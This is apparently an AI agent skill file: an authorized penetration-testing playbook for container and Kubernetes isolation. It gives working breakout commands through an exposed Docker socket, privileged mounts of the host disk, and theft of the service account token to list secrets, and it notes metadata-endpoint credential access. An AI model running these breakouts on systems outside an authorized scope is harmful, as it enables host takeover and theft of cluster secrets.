---
name: infra-container-escape-audit
description: Container and Kubernetes isolation assessment, Docker socket exposure, privileged container breakouts, hostPath volume mounts, and service account token abuse.
---

# Container & Kubernetes Isolation Assessment & Breakout Auditing

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified authorized container workload or Kubernetes pod namespace in `scope.yaml`.
- **Target Credentials / Context:** Interactive shell or command execution inside a container/pod.
- **Traffic Routing:** Route cluster API requests through Caido proxy or local proxy where applicable.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Environment & Capability Enumeration
Check if running inside a container and inspect effective capabilities:
```bash
# Check cgroup and virtualization markers
cat /proc/1/cgroup
ls -la /.dockerenv

# Inspect Linux capabilities
capsh --print
grep CapEff /proc/self/status
```

### Step 2: High-Risk Container Misconfigurations & Breakout Vectors

1. **Docker Socket Exposure (`/var/run/docker.sock`):**
   If mounted inside the container, spawn a new host-root container:
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
   # Or using curl against raw socket
   curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
     -d '{"Image":"alpine","Cmd":["chroot","/host","sh"],"Binds":["/:/host"]}' \
     http://localhost/containers/create
   ```

2. **Privileged Container (`--privileged` or `CAP_SYS_ADMIN`):**
   Mount host filesystem via release_agent or device exposure:
   ```bash
   # Check disks
   fdisk -l
   # Mount host root partition
   mkdir /mnt/host
   mount /dev/sda1 /mnt/host
   ```

3. **`hostPath` Volume Mounts:**
   Inspect mounted directories for host root (`/`), `/etc/shadow`, `/etc/kubernetes`, or `/var/log`.

### Step 3: Kubernetes Service Account Token Abuse
Locate and inspect the in-cluster service account token:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://kubernetes.default.svc"

# Query API server
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/secrets
```
Check API permissions via SelfSubjectAccessReview:
```bash
curl -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'$NAMESPACE'"}}' \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Breakout / Leak Vector | Vulnerability Mechanism | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **Docker Socket in CI/CD Runner** | Shared build runner with Docker socket | GitLab/GitHub runner executes container with `/var/run/docker.sock` | Full host host root `/host/etc/shadow` extraction |
| **Kubelet Read-Only Port 10255** | Exposed unauthenticated Kubelet port | `GET http://<node-ip>:10255/pods` | Full pod specs with plaintext environment secrets |
| **Over-Privileged ClusterRole** | SA token has `create pods` or `create deployments` | Service account spawns a pod mounting host `/` | Root host command execution |
| **Kubernetes Node Metadata SSRF** | Cloud instance metadata accessible from pod | Pod queries `http://169.254.169.254` to get Node IAM role | Node-level cloud provider takeover |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture command outputs showing container vs. host boundaries (e.g. `hostname`, `uname -a`, `/proc/1/cgroup` vs host mount).
2. **Impact Proof:** Demonstrate read access to non-sensitive host verification files (e.g., `/etc/os-release` or host network interfaces) without destructive changes.
3. **Remediation:** Drop `CAP_SYS_ADMIN`, disallow mounting the Docker socket, disable auto-mounting of Kubernetes service account tokens (`automountServiceAccountToken: false`), and enforce Pod Security Standards.
